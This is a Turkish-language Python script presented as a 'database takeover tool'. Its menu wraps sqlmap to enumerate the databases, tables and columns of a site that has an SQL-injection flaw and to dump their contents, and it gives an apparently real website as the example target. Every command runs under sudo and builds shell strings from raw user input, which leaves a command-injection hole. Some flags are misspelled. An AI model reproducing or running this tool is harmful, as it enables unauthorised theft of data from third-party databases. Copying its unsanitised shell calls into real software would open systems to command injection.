#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import os 

os.system("clear")
os.system("figlet VERI TABANI ELE GECIRME")

print("""\033[36mVeri Tabanı Ele Geçirme Aracı Hoş Geldiniz
\033[33m---------------------------------
\033[33m 1) Sadece Açıklı Linki Biliyorum.
\033[33m 2) Açıklı Linki, VeriTabanı Adını Biliyorum.
\033[33m 3) Açıklı Linki, VeriTabanı Adını, Tablo Adını Biliyorum.
\033[33m 4) Açıklı Linki, VeriTabanı Adını, Tablo Adını, Colon Adını Biliyorum.
\033[33m 5) Aracı yeniden başlat
\033[33m 6) Menüye Dön
\033[33m 7) Çık
\033[33m---------------------------------\033[0m

\033[32mÖrnek açıklı link \033[0m: http://wwww.suesupriano.com/article.php?id=25
""")

islemno = raw_input("\033[36mİşlem Numarası Giriniz:\033[0m ")


if(islemno == "1"):
	aciklilink = raw_input("Açıklı Linki Giriniz: ")
	os.system("sudo sqlmap -u " + aciklilink + " --dbs --random-agent")
	
elif(islemno == "2"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("Veritabanı Adını Giriniz: ")
	os.system("sudo sudo sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")

elif(islemno == "3"):
	aciklilink = raw_input("Açıklı Linki Giriniz: ")
	veritabani = raw_input("Veritabanı Adını Giriniz: ")
	tablo = raw_input("Tablo Adını Giriniz: ")
	os.system("sudo sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --colums --random-agent")
	
elif(islemno == "4"):
	aciklilink = raw_input("Açıklı Linki Giriniz: ")
	veritabani = raw_input("Veritabanı Adını Giriniz: ")
	tablo = raw_input("Tablo Adını Giriniz: ")
	colon = raw_input("Kolon Adını Giriniz: ")
	os.system("sudo sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")
	
elif(islemno == "5"):
	os.system("sudo python ./tools/Veritabanı_Ele_Geçirme.py")
	
elif(islemno == "6"):
	os.system("sudo python ./main.py")

elif(islemno == "7"):
	os.system("clear")
	os.system("exit")
else:
	os.system("sudo python ./tools/Veritabanı_Ele_Geçirme.py")
